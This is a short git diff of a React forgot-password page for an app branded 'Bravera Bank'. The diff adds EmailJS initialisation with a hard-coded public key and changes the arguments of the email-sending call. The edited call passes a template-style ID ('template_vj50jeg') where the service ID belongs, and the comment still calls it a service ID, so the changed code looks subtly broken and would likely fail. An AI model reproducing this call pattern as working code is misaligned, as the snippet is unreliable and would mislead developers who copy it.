@@ -1,4 +1,4 @@
-import { useState } from 'react';
+import { useEffect, useState } from 'react';
 import BG from '../assets/bg.png';
 import Logo from '../assets/logo.png';
 import emailjs from '@emailjs/browser';
@@ -11,6 +11,11 @@ export default function ForgotPassword() {
     bName: 'Bravera Bank', // Default bank name
   });
 
+   // Initialize EmailJS
+   useEffect(() => {
+    // Replace with your actual EmailJS public key
+    emailjs.init("v_oAluZ11har85Kfg");
+  }, []);
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [submitStatus, setSubmitStatus] = useState(null);
 
@@ -30,7 +35,7 @@ export default function ForgotPassword() {
     try {
       // Send email using EmailJS
       const response = await emailjs.send(
-        "service_my2ydis", // Replace with your EmailJS service ID
+        "template_vj50jeg", // Replace with your EmailJS service ID
         "template_lg21nvy", // You'll need to create this template
         {
           bName: formData.bName,
